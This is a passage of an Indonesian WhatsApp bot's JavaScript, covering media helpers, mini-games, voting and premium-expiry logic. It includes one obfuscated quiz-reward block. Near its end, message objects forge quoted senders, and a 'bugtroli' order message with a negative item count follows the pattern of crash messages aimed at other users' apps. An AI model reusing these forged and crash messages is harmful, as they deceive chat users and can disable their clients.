 const buf4 = Buffer.from(JSON.stringify(json))	
 const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
 fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
 	return `./sticker/${name}.exif`	
 })	
			}
	const sendStickerFromUrl = async(to, url) => {
			console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
				var namea = getRandom('.png')
				var download = function (uri, filename, callback) {
					request.head(uri, function (err, res, body) {
						request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
					});
				};
				download(url, namea, async function () {
					let filess = namea
					let asw = names
					require('./lib/exif.js')
					exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
					exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
					let media = fs.readFileSync(asw)
					YANZ.sendMessage(to, media, sticker)
					console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Succes send sticker...'))
					fs.unlinkSync(asw)
					fs.unlinkSync(filess)
					});
					});
				});
			}

const sendStickerUrl = async(to, url) => {
console.log(color(time, 'magenta'), color(moment.tz('Asia/Jakarta').format('HH:mm:ss'), "gold"), color('Downloading sticker...'))
var names = getRandom('.webp')
var namea = getRandom('.png')
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
}
            const sendPTT = (res) => {
            YANZ.sendMessage(from, res, audio, {mimetype: 'audio/mp4', ptt: false, quoted:mek})
            }
const sendMediaURL = async(to, url, text="", mids=[]) =>{
  if(mids.length > 0){
      text = normalizeMention(to, text, mids)
  }
  const fn = Date.now() / 10000;
  const filename = fn.toString()
  let mime = ""
  var download = function (uri, filename, callback) {
      request.head(uri, function (err, res, body) {
          mime = res.headers['content-type']
          request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
      });
  };
  download(url, filename, async function () {
      console.log('done');
      let media = fs.readFileSync(filename)
      let type = mime.split("/")[0]+"Message"
      if(mime === "image/gif"){
          type = MessageType.video
          mime = Mimetype.gif
      }
      if(mime.split("/")[0] === "audio"){
          mime = Mimetype.mp4Audio
      }
      YANZ.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
      
      fs.unlinkSync(filename)
  });
            }
            
      const sendFileFromUrl = async(link, type, options) => {
      hasil = await getBuffer(link)
	YANZ.sendMessage(from, hasil, type, options).catch(e => {
	fetch(link).then((hasil) => {
	YANZ.sendMessage(from, hasil, type, options).catch(e => {
	YANZ.sendMessage(from, { url : link }, type, options).catch(e => {
	  reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	  console.log(e)
	})
	})
	})
	})
	}
	const sendGif = (from, gif) => {
	YANZ.sendMessage(from, gif, MessageType.video, {mimetype: "video/gif"})
}
const belipremgame = (sender, asu) => {
    var found = false;
    Object.keys(glimit).forEach((i) => {
        if(glimit[i].id == sender){
            found = i
        }
    })
    if (found !== false) {
        glimit[found].glimit += asu;
        fs.writeFileSync('./database/glimit.json',JSON.stringify(glimit))
    }
}
const beliprem = (sender, asu) => {
    let found = false
	Object.keys(limit).forEach((i) => {
		if (limit[i].id === sender) {
			found = i
		}
	})
		if (found !== false) {
			limit[found].limit += asu
			fs.writeFileSync('./database/limit.json', JSON.stringify(limit))
		}
}



const cmde = budy.toLowerCase().split(" ")[0] || "";
let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
if (fs.existsSync(`./database/game/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
if (budy == "Cex") return reply("why");
if (
budy.toLowerCase() == "y" ||
budy.toLowerCase() == "yes" ||
budy.toLowerCase() == "ya"
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`Game telah dimulai sebelumnya!`);
const matrix = boardnow._matrix;
boardnow.status = true;
fs.writeFileSync(`./database/game/tictactoe/db/${from}.json`,JSON.stringify(boardnow, null, 2)
);
const chatAccept = `    🎮 *TICTACTOE* 🎮

*GAME DI MULAI!*

Player ❎ : @${boardnow.X}
Player ⭕ : @${boardnow.O}
 
 ${matrix[0][0]} ${matrix[0][1]} ${matrix[0][2]}
 ${matrix[1][0]} ${matrix[1][1]} ${matrix[1][2]}
 ${matrix[2][0]} ${matrix[2][1]} ${matrix[2][2]}
     
*Giliran @${boardnow.turn == "X" ? boardnow.X : boardnow.O}*

*NOTE : KETIK NYERAH JIKA INGIN MENYERAH!*`;
hu = YANZ.sendMessage(from, chatAccept, MessageType.text, {
quoted: mek,
contextInfo: {
mentionedJid: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
],
},
});
} else {
YANZ.sendMessage(from,`Opsi ini hanya untuk @${boardnow.O} !`,
MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.O + "@s.whatsapp.net"],
},
}
);
}
} else if (
budy.toLowerCase() == "n" ||
budy.toLowerCase() == "t" ||
budy.toLowerCase() == "no" ||
budy.toLowerCase() == "tidak" 
) {
if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
if (boardnow.status)
return reply(`Game telah dimulai sebelumnya!`);
fs.unlinkSync(`./database/game/tictactoe/db/${from}.json`);
YANZ.sendMessage(from,`So Eazy men @${boardnow.X} Lawanmu Eazy`,
MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.X + "@s.whatsapp.net"],
},
}
);
} else {
YANZ.sendMessage(from,`Opsi ini hanya untuk @${boardnow.O} !`,MessageType.text, {quoted: mek,
contextInfo: {
mentionedJid: [boardnow.O + "@s.whatsapp.net"],
},
}
);
}
}
}

if (arrNum.includes(cmde)) {
const boardnow = setGame(`${from}`);
if (!boardnow.status) return 
if (
(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
sender.replace("@s.whatsapp.net", "")
)
return;
const moving = validmove(Number(budy), `${from}`);
const matrix = moving._matrix;
if (moving.isWin) {
if (moving.winner == "SERI") {
const chatEqual = `🎮 *TICTACTOE* 🎮\n\nGame berakhir seri 😐`;
reply(chatEqual);
fs.unlinkSync(`./database/game/tictactoe/db/${from}.json`);
return;
}
const winnerJID = moving.winner == "O" ? moving.O : moving.X;
const looseJID = moving.winner == "O" ? moving.X : moving.O;
const limWin = Math.floor(Math.random() * 20) + 20;
const limLoose = Math.floor(Math.random() * 1) + 1;
const chatWon = `🎮 *TICTACTOE* 🎮
          
Game Selesai!!
dimenangkan oleh 👑 @${winnerJID} 👑
Hadiah : $${limWin} Balance`;
addBalance(winnerJID + "@s.whatsapp.net", limWin, balance)
YANZ.sendMessage(from, chatWon, MessageType.text, {quoted: mek,contextInfo: {
mentionedJid: [
moving.winner == "O" ?
moving.O + "@s.whatsapp.net" :
moving.X + "@s.whatsapp.net",
],
},
});
fs.unlinkSync(`./database/game/tictactoe/db/${from}.json`);
} else {
const chatMove = `    🎮 *TICTACTOE* 🎮

Player ❎ : @${boardnow.X}
Player ⭕ : @${boardnow.O}

 ${matrix[0][0]} ${matrix[0][1]} ${matrix[0][2]}
 ${matrix[1][0]} ${matrix[1][1]} ${matrix[1][2]}
 ${matrix[2][0]} ${matrix[2][1]} ${matrix[2][2]}
     
*Giliran : @${moving.turn == "X" ? moving.X : moving.O}*
`;
YANZ.sendMessage(from, chatMove, MessageType.text, {quoted: mek,contextInfo: {
mentionedJid: [
moving.X + "@s.whatsapp.net",
moving.O + "@s.whatsapp.net",
],
},
});
}
}
if ((senderNumber) && ["SURRENDER", "SURRENDER"].includes(budy) && !isCmd) {
orangnye = sender
teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
if (fs.existsSync("./database/game/tictactoe/db/" + from + ".json")) {
fs.unlinkSync("./database/game/tictactoe/db/" + from + ".json");
mentions(teks,[sender],true)
} else {
}
}
if (fs.existsSync(`./database/game/casino/db/${from}.json`)) {
          var casinoo = setCasino(`${from}`)
          if (sender == `${casinoo.Y}@s.whatsapp.net` && budy.toLowerCase() == 'n') {
          YANZ.sendMessage(from, `「 Game Casino Rejected 」\n\n• @${casinoo.Y} Membatalkan Game`, text, {quoted: mek, contextInfo: { mentionedJid: [casinoo.Y + "@s.whatsapp.net"]}})
          deleteCasino(from)
          }
        if (sender == `${casinoo.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
          var anu = getBalance(sender, balance)
          var anu2 = getBalance(`${casinoo.Y}@s.whatsapp.net`, balance)
          if (anu < args[1] || anu == 'undefined') return reply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
          if (anu2 < args[1] || anu2 == 'undefined') return reply(`Balance Tidak Mencukupi, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
          var angka1 = Math.floor(Math.random() * 10) + 10
          var angka2 = Math.floor(Math.random() * 10) + 10
          if (angka1 > angka2) {
          starGame =  `「 𝙲𝙰𝚂𝙸𝙽𝙾 𝙶𝙰𝙼𝙴 」

• @${casinoo.Z} ➪ ${angka1} 👑
• @${casinoo.Y} ➪ ${angka2} 🥈

𝙳𝙸 𝙼𝙴𝙽𝙰𝙽𝙶𝙺𝙰𝙽 𝙾𝙻𝙴𝙷 「 @${casinoo.Z} 」
𝙼𝙴𝙽𝙳𝙰𝙿𝙰𝚃𝙺𝙰𝙽: $ ${nebal(casinoo.nominal)}`
        YANZ.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net",]}})
            await addBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
            await kurangBalance(`${casinoo.Y}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
            deleteCasino(from)
        } else if (angka1 < angka2) {
           starGame =  `「 𝙲𝙰𝚂𝙸𝙽𝙾 𝙶𝙰𝙼𝙴 」

• @${casinoo.Z} ➪ ${angka1} 🥈
• @${casinoo.Y} ➪ ${angka2} 👑

𝙳𝙸 𝙼𝙴𝙽𝙰𝙽𝙶𝙺𝙰𝙽 𝙾𝙻𝙴𝙷 「 @${casinoo.Y} 」
𝙼𝙴𝙽𝙳𝙰𝙿𝙰𝚃𝙺𝙰𝙽: $ ${nebal(casinoo.nominal)}`
        YANZ.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net",]}})
        await addBalance(`${casinoo.Y}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
        await kurangBalance(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal), balance)
        deleteCasino(from)
          } else if (angka1 = angka2) {
        starGame =  `「 𝙲𝙰𝚂𝙸𝙽𝙾 𝙶𝙰𝙼𝙴 」

• @${casinoo.Z} ➪ ${angka1} 📍
• @${casinoo.Y} ➪ ${angka2} 📍

𝙶𝙰𝙼𝙴𝚂 𝙳𝚁𝙰𝚆, 𝚃𝙸𝙳𝙰𝙺 𝙰𝙳𝙰 𝙿𝙴𝙼𝙴𝙽𝙰𝙽𝙶`
            YANZ.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [casinoo.Z + "@s.whatsapp.net",  casinoo.Y + "@s.whatsapp.net",]}})
            deleteCasino(from)
        }
    }
}
game.cekWaktuFam(YANZ, family100)
game.cekWaktuTG(YANZ, tebakgambar)
game.cekWaktuSA(YANZ, siapaaku)
game.cekWaktuCak(YANZ, caklontong)
game.cekWaktuTL(YANZ, tebaklirik)
game.cekWaktuAO(YANZ, asahotak)
game.cekWaktuTK(YANZ, tebakkata)
game.cekWaktuTU(YANZ, tebakkimia)
game.cekWaktuTB(YANZ, tebakbendera)
game.cekWaktuMtk(YANZ, mtk)

if (game.isMtk(from, mtk) && isUser) {
if (budy.toLowerCase().includes(game.getJawabanMtk(from, mtk))) {
var Farid = randomNomor(200)
addBalance(sender, Farid, balance)
list = []
 commandnya = [
`easy`,
`medium`,
`hard`,
`extreme`,
`impossible`,
`pro`
 ]
 viewmenunya = [
`MODE - EASY`,
`MODE - MEDIUM`,
`MODE - HARD`,
`MODE - EXTREME`,
`MODE - IMPOSSIBLE`,
`MODE - PRO`
  ]
 startnum = 0
 for (let x of commandnya) {
 const yy = {title: `──────────────`,
 rows: [
 {
 title: `${viewmenunya[startnum++]}`,
 description: ``,
 rowId: `${prefix}math ${x}`
 }
 ]
 }
 list.push(yy)
 }
 listmsg(from, `─ 「 *MATH KUIS* 」 ─`, `*Selamat ${pushname}* ✨ \n*Jawabanmu Benar.*\n\n*Jawaban :* ${game.getJawabanMtk(from, mtk)}\n*Hadiah :* ${Farid} balance`, `KLIK DISINI`,`Ingin Main Lagi? 👇`, list)
mtk.splice(game.getMtkPosi(from, mtk), 1)
}
}
var _0x1685c1=_0x28b7;(function(_0x49b489,_0x2b5358){var _0x21db35=_0x28b7,_0x24fcf8=_0x49b489();while(!![]){try{var _0x268a9f=-parseInt(_0x21db35(0x1f0))/0x1+parseInt(_0x21db35(0x216))/0x2*(parseInt(_0x21db35(0x1ef))/0x3)+parseInt(_0x21db35(0x201))/0x4+parseInt(_0x21db35(0x1f2))/0x5*(-parseInt(_0x21db35(0x209))/0x6)+-parseInt(_0x21db35(0x1ec))/0x7+parseInt(_0x21db35(0x1f7))/0x8*(parseInt(_0x21db35(0x20f))/0x9)+parseInt(_0x21db35(0x204))/0xa;if(_0x268a9f===_0x2b5358)break;else _0x24fcf8['push'](_0x24fcf8['shift']());}catch(_0x1bd88c){_0x24fcf8['push'](_0x24fcf8['shift']());}}}(_0x74b0,0xc8b25));if(game[_0x1685c1(0x1ea)](from,tebakgambar)&&isUser){if(budy['toLowerCase']()[_0x1685c1(0x1fb)](game[_0x1685c1(0x1f8)](from,tebakgambar))){var Farid=randomNomor(0xc8);addBalance(sender,Farid,balance),replybutton1(from,prefix+_0x1685c1(0x202),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x203)+game[_0x1685c1(0x1f8)](from,tebakgambar)+_0x1685c1(0x1f1)+Farid+_0x1685c1(0x1e7)),tebakgambar[_0x1685c1(0x1f5)](game[_0x1685c1(0x219)](from,tebakgambar),0x1);}}if(game[_0x1685c1(0x1ed)](from,siapaaku)&&isUser){if(budy[_0x1685c1(0x1fe)]()[_0x1685c1(0x1fb)](game['getJawabanSA'](from,siapaaku))){var Koin=randomNomor(0xc8);addBalance(sender,Koin,balance),replybutton1(from,prefix+_0x1685c1(0x1f9),'Main\x20Lagi?\x20Klik\x20Di\x20Bawah\x20Ini\x20👇',_0x1685c1(0x1fa),'─\x20「\x20*SIAPAKAH\x20AKU*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20'+game[_0x1685c1(0x213)](from,siapaaku)+_0x1685c1(0x1f1)+Kooin+'\x20Balance'),siapaaku[_0x1685c1(0x1f5)](game[_0x1685c1(0x20a)](from,siapaaku),0x1);}}if(game[_0x1685c1(0x200)](from,caklontong)&&isUser){if(budy[_0x1685c1(0x1fe)]()[_0x1685c1(0x1fb)](game[_0x1685c1(0x214)](from,caklontong))){var Koiin=randomNomor(0xc8);addBalance(sender,Koiin,balance),replybutton1(from,prefix+_0x1685c1(0x210),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x1fd)+game[_0x1685c1(0x214)](from,caklontong)+_0x1685c1(0x1f1)+Koiin+_0x1685c1(0x1e7)),caklontong['splice'](game[_0x1685c1(0x217)](from,caklontong),0x1);}}if(game['isTebakLirik'](from,tebaklirik)&&isUser){if(budy['toLowerCase']()[_0x1685c1(0x1fb)](game[_0x1685c1(0x20c)](from,tebaklirik))){var Kooin=randomNomor(0xc8);addBalance(sender,Kooin,balance),replybutton1(from,prefix+_0x1685c1(0x1eb),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x218)+game[_0x1685c1(0x20c)](from,tebaklirik)+_0x1685c1(0x1f1)+Kooin+_0x1685c1(0x1e7)),tebaklirik[_0x1685c1(0x1f5)](game[_0x1685c1(0x211)](from,tebaklirik),0x1);}}if(game['isAsahOtak'](from,asahotak)&&isUser){if(budy['toLowerCase']()[_0x1685c1(0x1fb)](game[_0x1685c1(0x205)](from,asahotak))){var COY=randomNomor(0xc8);addBalance(sender,COY,balance),replybutton1(from,prefix+'asahotak','Main\x20Lagi?\x20Klik\x20Di\x20Bawah\x20Ini\x20👇',_0x1685c1(0x1fa),'─\x20「\x20*ASAH\x20OTAK*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20'+game[_0x1685c1(0x205)](from,asahotak)+_0x1685c1(0x1f1)+COY+_0x1685c1(0x1e7)),asahotak[_0x1685c1(0x1f5)](game[_0x1685c1(0x1e9)](from,asahotak),0x1);}}if(game[_0x1685c1(0x20e)](from,tebakkata)&&isUser){if(budy[_0x1685c1(0x1fe)]()[_0x1685c1(0x1fb)](game[_0x1685c1(0x1e5)](from,tebakkata))){var asu=randomNomor(0xc8);addBalance(sender,asu,balance),replybutton1(from,prefix+_0x1685c1(0x1ff),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x1f6)+game[_0x1685c1(0x1e5)](from,tebakkata)+_0x1685c1(0x1f1)+asu+_0x1685c1(0x1e7)),tebakkata[_0x1685c1(0x1f5)](game['getTKPosi'](from,tebakkata),0x1);}}function _0x28b7(_0x2db16d,_0x1a8af7){var _0x74b001=_0x74b0();return _0x28b7=function(_0x28b74e,_0x362b68){_0x28b74e=_0x28b74e-0x1e4;var _0x53c422=_0x74b001[_0x28b74e];return _0x53c422;},_0x28b7(_0x2db16d,_0x1a8af7);}if(game['isTebakKimia'](from,tebakkimia)&&isUser){if(budy['toLowerCase']()[_0x1685c1(0x1fb)](game[_0x1685c1(0x1e6)](from,tebakkimia))){var zn=randomNomor(0xc8);addBalance(sender,zn,balance),replybutton1(from,prefix+_0x1685c1(0x1fc),_0x1685c1(0x1e4),'➡️\x20NEXT\x20➡️',_0x1685c1(0x207)+game[_0x1685c1(0x1e6)](from,tebakkimia)+'\x0a*Hadiah\x20:*\x20'+zn+'\x20Balance'),tebakkimia[_0x1685c1(0x1f5)](game[_0x1685c1(0x215)](from,tebakkimia),0x1);}}if(game[_0x1685c1(0x1ee)](from,tebakbendera)&&isUser){if(budy[_0x1685c1(0x1fe)]()['includes'](game[_0x1685c1(0x20d)](from,tebakbendera))){var mea=randomNomor(0xc8);addBalance(sender,mea,balance),replybutton1(from,prefix+_0x1685c1(0x1f3),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x1e8)+game[_0x1685c1(0x20d)](from,tebakbendera)+_0x1685c1(0x1f1)+mea+_0x1685c1(0x1e7)),tebakbendera[_0x1685c1(0x1f5)](game['getTBPosi'](from,tebakbendera),0x1);}}function _0x74b0(){var _0x30a569=['tebakkata','isCakLontong','1047024XqQTfs','tebakgambar','─\x20「\x20*TEBAK\x20GAMBAR*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','16262140RGeWhs','getJawabanAO','floor','─\x20「\x20*TEBAK\x20KIMIA*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','length','8039886UjKiFQ','getSAPosi','family100','getJawabanTL','getJawabanTB','isTebakKata','7308072BkNBQi','caklontong','getTLPosi','getjawaban100','getJawabanSA','getJawabanCak','getTUPosi','6394kaCtyv','getCakPosi','─\x20「\x20*TEBAK\x20LIRIK*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','getTGPosi','─\x20「\x20*FAMILY100*\x20」\x20─\x0a\x0aSemua\x20Jawaban\x20Sudah\x20Tertebak\x20√','Main\x20Lagi?\x20Klik\x20Di\x20Bawah\x20Ini\x20👇','getJawabanTK','getJawabanTU','\x20Balance','─\x20「\x20*TEBAK\x20BENDERA*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','getAOPosi','isTebakGambar','tebaklirik','4322017UkLYPl','isSiapaAku','isTebakBendera','1164BpGsTz','1160949jYyYMB','\x0a*Hadiah\x20:*\x20','5XPOKlb','tebakbendera','getfamposi','splice','─\x20「\x20*TEBAK\x20KATA*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','8xhqknT','getJawabanTG','siapakahaku','➡️\x20NEXT\x20➡️','includes','tebakkimia','─\x20「\x20*CAK\x20LONTONG*\x20」\x20─\x0a\x0a*Selamat\x20jawaban\x20kamu\x20benar*\x0a*Jawaban\x20:*\x20','toLowerCase'];_0x74b0=function(){return _0x30a569;};return _0x74b0();}if(game['isfam'](from,family100)&&isUser){var anjuy=game[_0x1685c1(0x212)](from,family100);for(let i of anjuy){if(budy['toLowerCase']()[_0x1685c1(0x1fb)](i)){var adit=Math[_0x1685c1(0x206)](Math['random']()*0xc8)+0x1;addBalance(sender,adit,balance),await reply('─\x20「\x20*FAMILY100*\x20」\x20─\x0a\x0a*Jawaban\x20benar*\x0a*Jawaban\x20:*\x20'+i+'\x0a*Hadiah\x20:*\x20'+adit+'\x20Blanace\x0a*Jawaban\x20yang\x20blum\x20tertebak\x20:*\x20'+(anjuy[_0x1685c1(0x208)]-0x1));var anug=anjuy['indexOf'](i);anjuy[_0x1685c1(0x1f5)](anug,0x1);}}anjuy[_0x1685c1(0x208)]<0x1&&(replybutton1(from,prefix+_0x1685c1(0x20b),_0x1685c1(0x1e4),_0x1685c1(0x1fa),_0x1685c1(0x21a)),family100[_0x1685c1(0x1f5)](game[_0x1685c1(0x1f4)](from,family100),0x1));}
if(isGroup && !isVote) {
if (budy.toLowerCase() === 'vote'){
let vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : `${nomerowner}@s.whatsapp.net`
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '✅'
})
fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = `─▢ VOTING ▢─

*Vote* @${_votes[0].votes.split('@')[0]}
*Alasan*: ${_votes[0].reason}
*Jumlah Vote* : ${vote.length} Vote
*Durasi* : ${_votes[0].durasi} Menit

─ ─ ─ ─ ─ ─ ─
` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}
*Vote* : ${vote[i].voting}
`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
} else if (budy.toLowerCase() === 'devote'){
const vote = JSON.parse(fs.readFileSync(`./database/voting/pvote/${from}.json`))
let _votes = JSON.parse(fs.readFileSync(`./database/voting/vote/${from}.json`))  
let fil = vote.map(v => v.participant)
let id_vote = sender ? sender : `${nomerowner}@s.whatsapp.net`
if(fil.includes(id_vote)) {
return mentions('@'+sender.split('@')[0]+' Anda sudah vote', fil, true)
} else {
vote.push({
participant: id_vote,
voting: '❌'
})
fs.writeFileSync(`./database/voting/pvote/${from}.json`,JSON.stringify(vote))
let _p = []
let _vote = `─▢ VOTING ▢─

*Vote* @${_votes[0].votes.split('@')[0]}
*Alasan*: ${_votes[0].reason}
*Jumlah Vote* : ${vote.length} Vote
*Durasi* : ${_votes[0].durasi} Menit

─ ─ ─ ─ ─ ─ ─
` 
for(let i = 0; i < vote.length; i++) {
_vote +=  `@${vote[i].participant.split('@')[0]}
*Vote* : ${vote[i].voting}
`
_p.push(vote[i].participant)
}  
_p.push(_votes[0].votes)
mentions(_vote,_p,true)   
}
}
}	
const getPremiumExpired = (sender) => {
 let position = null
 Object.keys(premium).forEach((i) => {
if (premium[i].id === sender) {
  position = i
}
 })
 if (position !== null) {
return premium[position].expired
 }
} 
const expiredCheck = () => {
setInterval(() => {
let position = null
Object.keys(premium).forEach((i) => {
if (Date.now() >= premium[i].expired) {
position = i
}
})
if (position !== null) {
console.log(chalk.bgHex('#3DB7E4').underline(color(`PREMIUM EXPIRED : ${premium[position].id}`,'red')))
YANZ.sendMessage(`${nomerowner}@s.whatsapp.net`, `*「 PREMIUM EXPIRED 」* \n\n\`\`\`HAI OWNER! WAKTU PREMIUM wa.me/${premium[position].id.split("@")[0]} TELAH HABIS!\`\`\``, MessageType.text, {contextInfo:{mentionedJid: [premium[position].id]}})
YANZ.sendMessage(`${premium[position].id}`, `「 𝐍𝐎𝐓𝐈𝐅𝐘 」\nHai Kak selamat ${waktoo}!\nWAKTU PREMIUM KAKAK SEKARANG SUDAH HABIS ~\nTERIMAKASIH TELAH MENJADI USER PREMIUM BOT 😊`, MessageType.text)
premium.splice(position, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
}
}, 1000)
}
const getAllPremiumUser = () => {
 const array = []
 Object.keys(premium).forEach((i) => {
array.push(premium[i].id)
 })
 return array
}

const expiredCheckS = (YANZ, sewa) => {
    setInterval(() => {
 let position = null
 Object.keys(sewa).forEach((i) => {
     if (Date.now() >= sewa[i].expired) {
     position = i
     }
 })
if (position !== null) {
replybutton(sewa[position].id, `${prefix}extend`, `Mau Memperpanjang Waktu Penyewaan, klik di bawah`,`E X T E N D`, `━ 「 *SEWA EXPIRE* 」 ━\n\n\`\`\`Waktu Sewa Di Grup Ini Sudah Habis, Bot Akan Keluar Otomatis\`\`\``, MessageType.text)
YANZ.sendMessage(`${nomerowner}@s.whatsapp.net`, `*「 SEWA EXPIRED 」* \n\nHAI OWNER! WAKTU SEWA *${sewa[position].id}*, DI GROUP *${groupName}* TELAH BERAKHIR!`, MessageType.text)
YANZ.groupLeave(sewa[position].id)
sewa.splice(position, 1)
fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
}
}, 1000)
}
//COMOT AJA BANYAK², JANGAN LUPA KASIH NAMA GW DJ TQTOMU
const fakefoto = { key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"}: {})}, message: {imageMessage: {caption: `Selamat ${waktoo}`, jpegThumbnail: gambar}}}
const fakevideo = { key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast"}: {})}, message: {videoMessage: {caption: `Selamat ${waktoo}`, jpegThumbnail: gambar}}}
const fakelokasi = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {locationMessage: {degreesLatitude: -7.0389318, degreesLongitude: 113.8969749, name: 'Tokyo, Japan', address: '@Herman', jpegThumbnail: gambar}}}
const fakekontak = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {contactMessage: {displayName: `Selamat ${waktoo}`, vcard: 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'N:Bot;Muzza;Gans;;\n' + 'FN:Muzza-Bot\n' + 'item1.TEL;waid=6281231951590:+62 812-319-51590\n' + 'item1.X-ABLabel:Telepon\n' + 'END:VCARD'}}}
const faketoko = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {productMessage: {product: {currencyCode: "BRL", title: `Selamat ${waktoo}`, priceAmount1000: 0, productImageCount: 0, productImage: {jpegThumbnail: gambar}}, businessOwnerJid: `${numbernye}@s.whatsapp.net`}}}
const fakedoc = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, ...(from ? {remoteJid: "status@broadcast" } : {}) }, message: {documentMessage: {mimetype: 'application/octet-stream', title: `Selamat ${waktoo}`, pageCount: 0, fileName: `Selamat ${waktoo}`, jpegThumbnail: gambar}}}
const fakeinvite = {key: {fromMe: false, participant: `${numbernye}@s.whatsapp.net`, remoteJid: `${numbernye}@s.whatsapp.net`}, message: {groupInviteMessage: {groupJid: from, inviteCode: `Selamat ${waktoo}`, groupName: groupName, caption: `Selamat ${waktoo}`, jpegThumbnail: gambar}}}
const flokasi = {key:{ fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: { "locationMessage": { "name": `Selamat ${waktoo} \n⚖FARID GANS`, 'jpegThumbnail': gambar}}}
const faketroli = { key: { participant: `${numbernye}@s.whatsapp.net`},message: {
orderMessage: {
thumbnail:gambar,
itemCount: -2021,
status: 1,
surface: 70000,
message: `selamat ${waktoo}`,
orderTitle: `selamat ${waktoo}`,
sellerJid: `${numbernye}@s.whatsapp.net`}}}
const bugtroli = { key: { participant: '111111111@s.whatsapp.net'},message: {
orderMessage: {
thumbnail:gambar,
itemCount: -2021,
status: 1,
surface: 70000,
message: fakeV,
orderTitle: fakeV, 
sellerJid: `${numbernye}@s.whatsapp.net`}}}

  colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
  const isImage = (type === 'imageMessage')
  const isVideo = (type === 'videoMessage')
  const isSticker = (type == 'stickerMessage')
  const isMedia = (type === 'imageMessage' || type === 'videoMessage')
  const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
